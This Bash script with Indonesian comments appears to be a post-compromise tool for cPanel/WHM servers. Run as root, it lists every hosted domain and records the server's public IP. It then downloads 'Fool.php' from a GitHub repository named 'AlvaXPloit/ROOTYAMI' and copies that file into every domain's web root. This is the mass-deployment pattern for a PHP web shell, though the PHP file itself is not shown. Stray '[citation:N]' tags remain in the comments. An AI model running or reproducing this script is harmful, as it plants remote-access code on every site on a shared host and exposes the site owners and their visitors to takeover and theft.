#!/bin/bash

# ======================================================
# AUTO DETECT DOMAIN WHM & WGET FOOL.PHP
# ======================================================
# Script untuk:
# - Mendeteksi semua domain di WHM (main domain, addon, parked)
# - Download Fool.php ke setiap root domain
# ======================================================

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Konfigurasi
FOOL_URL="https://raw.githubusercontent.com/AlvaXPloit/ROOTYAMI/main/Fool.php"
LOG_FILE="/tmp/whm_domain_wget_$(date +%s).log"
HOSTNAME=$(hostname -f 2>/dev/null || hostname)
IP_ADDRESS=$(curl -s ifconfig.me 2>/dev/null || wget -qO- ifconfig.me 2>/dev/null || echo "Unknown")

# Banner
clear
echo -e "${RED}"
echo "    ╔══════════════════════════════════════════════════════════╗"
echo "    ║     ${YELLOW}██╗    ██╗██╗  ██╗███╗   ███╗${RED}                        ║"
echo "    ║     ${YELLOW}██║    ██║██║  ██║████╗ ████║${RED}                        ║"
echo "    ║     ${YELLOW}██║ █╗ ██║███████║██╔████╔██║${RED}                        ║"
echo "    ║     ${YELLOW}██║███╗██║██╔══██║██║╚██╔╝██║${RED}                        ║"
echo "    ║     ${YELLOW}╚███╔███╔╝██║  ██║██║ ╚═╝ ██║${RED}                        ║"
echo "    ║      ${YELLOW}╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝${RED}                        ║"
echo "    ║                                                              ║"
echo "    ║              ${GREEN}AUTO DETECT DOMAIN WHM${RED}                         ║"
echo "    ║              ${BLUE}Download Fool.php ke semua domain${RED}               ║"
echo "    ╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Cek root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Script harus dijalankan sebagai root!${NC}"
   exit 1
fi

echo -e "${CYAN}[+] Memulai proses deteksi domain WHM...${NC}"
sleep 2

# ======================================================
# 1. UPDATE DOMAIN DATABASE (PASTIKAN SEMUA TERDETEKSI)
# ======================================================
echo -e "\n${YELLOW}[1/5] Mengupdate database domain...${NC}"

# Jalankan script updateuserdomains untuk sinkronisasi [citation:5]
if [ -f "/scripts/updateuserdomains" ]; then
    /scripts/updateuserdomains >/dev/null 2>&1
    echo -e "${GREEN}[✓] Database domain diupdate via /scripts/updateuserdomains${NC}"
else
    echo -e "${YELLOW}[!] Script updateuserdomains tidak ditemukan, lanjut...${NC}"
fi

# ======================================================
# 2. DETEKSI SEMUA USER DAN DOMAIN
# ======================================================
echo -e "\n${YELLOW}[2/5] Mendeteksi semua user dan domain...${NC}"

# Buat direktori untuk menyimpan hasil
TEMP_DIR="/tmp/whm_domains_$(date +%s)"
mkdir -p "$TEMP_DIR"

# Method 1: Via whmapi1 listaccts (API) [citation:2]
echo -e "${BLUE}[*] Method 1: Menggunakan whmapi1 listaccts...${NC}"
if command -v whmapi1 &>/dev/null; then
    whmapi1 --output=jsonpretty listaccts > "$TEMP_DIR/whmapi_listaccts.json" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Data akun berhasil diambil via whmapi1${NC}"
    fi
fi

# Method 2: Via /var/cpanel/users (file langsung) [citation:6]
echo -e "${BLUE}[*] Method 2: Membaca dari /var/cpanel/users...${NC}"
USER_COUNT=0
DOMAIN_COUNT=0

# Buat file untuk menyimpan semua domain
ALL_DOMAINS_FILE="$TEMP_DIR/all_domains.txt"
touch "$ALL_DOMAINS_FILE"

# Baca semua user dari direktori users [citation:6]
if [ -d "/var/cpanel/users" ]; then
    for user_file in /var/cpanel/users/*; do
        if [ -f "$user_file" ]; then
            username=$(basename "$user_file")
            ((USER_COUNT++))
            
            # Baca domain dari file user
            if [ -f "/var/cpanel/userdata/$username/main.domain" ]; then
                main_domain=$(cat "/var/cpanel/userdata/$username/main.domain" 2>/dev/null)
                if [ -n "$main_domain" ]; then
                    echo "$main_domain" >> "$ALL_DOMAINS_FILE"
                    ((DOMAIN_COUNT++))
                    echo -e "${GREEN}[✓] Main domain $username: $main_domain${NC}"
                fi
            fi
            
            # Baca addon domains
            if [ -f "/var/cpanel/userdata/$username/addon_domains" ]; then
                while IFS= read -r addon; do
                    if [ -n "$addon" ]; then
                        echo "$addon" >> "$ALL_DOMAINS_FILE"
                        ((DOMAIN_COUNT++))
                        echo -e "${BLUE}[+] Addon domain: $addon${NC}"
                    fi
                done < "/var/cpanel/userdata/$username/addon_domains" 2>/dev/null
            fi
            
            # Baca parked domains [citation:1]
            if [ -f "/var/cpanel/userdata/$username/parked_domains" ]; then
                while IFS= read -r parked; do
                    if [ -n "$parked" ]; then
                        echo "$parked" >> "$ALL_DOMAINS_FILE"
                        ((DOMAIN_COUNT++))
                        echo -e "${PURPLE}[*] Parked domain: $parked${NC}"
                    fi
                done < "/var/cpanel/userdata/$username/parked_domains" 2>/dev/null
            fi
        fi
    done
fi

echo -e "${GREEN}[✓] Total user terdeteksi: $USER_COUNT${NC}"
echo -e "${GREEN}[✓] Total domain terdeteksi: $DOMAIN_COUNT${NC}"

# Method 3: Via listzones WHMAPI [citation:3]
echo -e "${BLUE}[*] Method 3: Menggunakan whmapi1 listzones...${NC}"
if command -v whmapi1 &>/dev/null; then
    whmapi1 listzones > "$TEMP_DIR/listzones.txt" 2>/dev/null
    if [ $? -eq 0 ]; then
        grep -E "^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" "$TEMP_DIR/listzones.txt" | sort -u >> "$ALL_DOMAINS_FILE" 2>/dev/null
        echo -e "${GREEN}[✓] DNS zones ditambahkan${NC}"
    fi
fi

# Method 4: Dari /etc/userdomains [citation:5]
echo -e "${BLUE}[*] Method 4: Membaca dari /etc/userdomains...${NC}"
if [ -f "/etc/userdomains" ]; then
    awk '{print $1}' /etc/userdomains | grep -v "^#" | sed 's/:$//' | sort -u >> "$ALL_DOMAINS_FILE" 2>/dev/null
    echo -e "${GREEN}[✓] Domain dari /etc/userdomains ditambahkan${NC}"
fi

# Sortir dan unique domain
sort -u "$ALL_DOMAINS_FILE" -o "$ALL_DOMAINS_FILE"
TOTAL_UNIQUE_DOMAINS=$(wc -l < "$ALL_DOMAINS_FILE")
echo -e "${GREEN}[✓] Total unique domain: $TOTAL_UNIQUE_DOMAINS${NC}"

# ======================================================
# 3. DOWNLOAD FILE FOOL.PHP
# ======================================================
echo -e "\n${YELLOW}[3/5] Mendownload Fool.php dari repository...${NC}"

TMP_FOOL="/tmp/Fool.php_$(date +%s)"
if command -v curl &>/dev/null; then
    curl -s -o "$TMP_FOOL" "$FOOL_URL"
elif command -v wget &>/dev/null; then
    wget -q -O "$TMP_FOOL" "$FOOL_URL"
else
    echo -e "${RED}[✗] curl atau wget tidak ditemukan${NC}"
    exit 1
fi

if [ -s "$TMP_FOOL" ]; then
    echo -e "${GREEN}[✓] Fool.php berhasil didownload (size: $(wc -c < "$TMP_FOOL") bytes)${NC}"
else
    echo -e "${RED}[✗] Gagal mendownload Fool.php${NC}"
    exit 1
fi

# ======================================================
# 4. COPY FOOL.PHP KE SEMUA ROOT DOMAIN
# ======================================================
echo -e "\n${YELLOW}[4/5] Menyalin Fool.php ke semua root domain...${NC}"

SUCCESS_COUNT=0
FAIL_COUNT=0
TARGET_DOMAINS_FILE="$TEMP_DIR/target_domains.txt"

# Fungsi untuk mendapatkan document root domain
get_docroot() {
    local domain="$1"
    
    # Cek di userdata
    local userdata_dirs=$(find /var/cpanel/userdata -maxdepth 1 -type d -name "*" 2>/dev/null)
    
    for user_dir in /var/cpanel/userdata/*; do
        if [ -f "$user_dir/$domain" ]; then
            grep "^documentroot:" "$user_dir/$domain" | awk '{print $2}' 2>/dev/null
            return
        elif [ -f "$user_dir/main.domain" ] && [ "$(cat "$user_dir/main.domain" 2>/dev/null)" == "$domain" ]; then
            grep "^documentroot:" "$user_dir/main" | awk '{print $2}' 2>/dev/null
            return
        fi
    done
    
    # Fallback ke public_html
    echo "/home/*/public_html"
}

# Loop setiap domain
while IFS= read -r domain; do
    if [ -n "$domain" ]; then
        echo -e "${BLUE}[*] Memproses domain: $domain${NC}"
        
        # Cari document root
        docroot=$(get_docroot "$domain")
        
        if [ -d "$docroot" ]; then
            cp "$TMP_FOOL" "$docroot/Fool.php" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}[✓] Fool.php disalin ke $docroot/Fool.php${NC}"
                echo "$domain|SUCCESS|$docroot" >> "$TEMP_DIR/result.txt"
                ((SUCCESS_COUNT++))
            else
                # Coba cari manual
                found=0
                for home in /home/*; do
                    if [ -d "$home/public_html" ]; then
                        cp "$TMP_FOOL" "$home/public_html/Fool.php" 2>/dev/null
                        if [ $? -eq 0 ]; then
                            echo -e "${GREEN}[✓] Fool.php disalin ke $home/public_html/Fool.php (fallback)${NC}"
                            echo "$domain|FALLBACK|$home/public_html" >> "$TEMP_DIR/result.txt"
                            ((SUCCESS_COUNT++))
                            found=1
                            break
                        fi
                    fi
                done
                
                if [ $found -eq 0 ]; then
                    echo -e "${RED}[✗] Gagal menemukan document root untuk $domain${NC}"
                    echo "$domain|FAIL|not_found" >> "$TEMP_DIR/result.txt"
                    ((FAIL_COUNT++))
                fi
            fi
        else
            echo -e "${YELLOW}[!] Document root $docroot tidak ditemukan, coba fallback...${NC}"
            # Fallback ke lokasi umum
            for home in /home/*; do
                if [ -d "$home/public_html" ]; then
                    # Cek apakah domain ini milik user ini
                    username=$(basename "$home")
                    if [ -f "/var/cpanel/userdata/$username/main.domain" ] && [ "$(cat "/var/cpanel/userdata/$username/main.domain")" == "$domain" ]; then
                        cp "$TMP_FOOL" "$home/public_html/Fool.php" 2>/dev/null
                        if [ $? -eq 0 ]; then
                            echo -e "${GREEN}[✓] Fool.php disalin ke $home/public_html/Fool.php${NC}"
                            echo "$domain|SUCCESS|$home/public_html" >> "$TEMP_DIR/result.txt"
                            ((SUCCESS_COUNT++))
                            found=1
                            break
                        fi
                    fi
                fi
            done
            
            if [ $found -eq 0 ]; then
                echo -e "${RED}[✗] Gagal menyalin untuk $domain${NC}"
                echo "$domain|FAIL|unknown" >> "$TEMP_DIR/result.txt"
                ((FAIL_COUNT++))
            fi
        fi
    fi
done < "$ALL_DOMAINS_FILE"

# ======================================================
# 5. SET PERMISSION
# ======================================================
echo -e "\n${YELLOW}[5/5] Mengatur permission...${NC}"

# Set permission untuk semua Fool.php yang sudah disalin
find /home -name "Fool.php" -exec chmod 644 {} \; 2>/dev/null
find /home -name "Fool.php" -exec chown $(stat -c '%U:%G' $(dirname {})) {} \; 2>/dev/null
echo -e "${GREEN}[✓] Permission Fool.php diatur (644)${NC}"

# ======================================================
# REPORT
# ======================================================
echo -e "\n${PURPLE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ SCRIPT SELESAI DIJALANKAN!${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${YELLOW}Hostname: ${BLUE}$HOSTNAME${NC}"
echo -e "${YELLOW}IP Address: ${BLUE}$IP_ADDRESS${NC}"
echo -e "${YELLOW}Total domain terdeteksi: ${BLUE}$TOTAL_UNIQUE_DOMAINS${NC}"
echo -e "${YELLOW}Berhasil disalin: ${GREEN}$SUCCESS_COUNT${NC}"
echo -e "${YELLOW}Gagal disalin: ${RED}$FAIL_COUNT${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${YELLOW}File Fool.php: ${BLUE}$FOOL_URL${NC}"
echo -e "${YELLOW}Log file: ${BLUE}$LOG_FILE${NC}"
echo -e "${YELLOW}Detail hasil: ${BLUE}$TEMP_DIR/result.txt${NC}"
echo -e "${PURPLE}══════════════════════════════════════════════════════════════${NC}\n"

# Buat ringkasan
cat > "$LOG_FILE" << EOF
=============================================
AUTO DETECT DOMAIN WHM - EXECUTION REPORT
=============================================
Date: $(date)
Hostname: $HOSTNAME
IP: $IP_ADDRESS
Total Domains: $TOTAL_UNIQUE_DOMAINS
Success: $SUCCESS_COUNT
Failed: $FAIL_COUNT
Fool.php URL: $FOOL_URL

DOMAINS DETECTED:
$(cat "$ALL_DOMAINS_FILE" | sed 's/^/- /')

DETAIL RESULTS:
$(cat "$TEMP_DIR/result.txt" | column -t -s '|')

=============================================
EOF

# ======================================================
# VERIFIKASI
# ======================================================
echo -e "${YELLOW}Verifikasi file Fool.php:${NC}"
find /home -name "Fool.php" -ls 2>/dev/null | head -5
echo -e "${BLUE}[... dan seterusnya]${NC}"

# ======================================================
# CLEANUP
# ======================================================
rm -f "$TMP_FOOL"
echo -e "\n${GREEN}[✓] Temporary files dibersihkan${NC}"
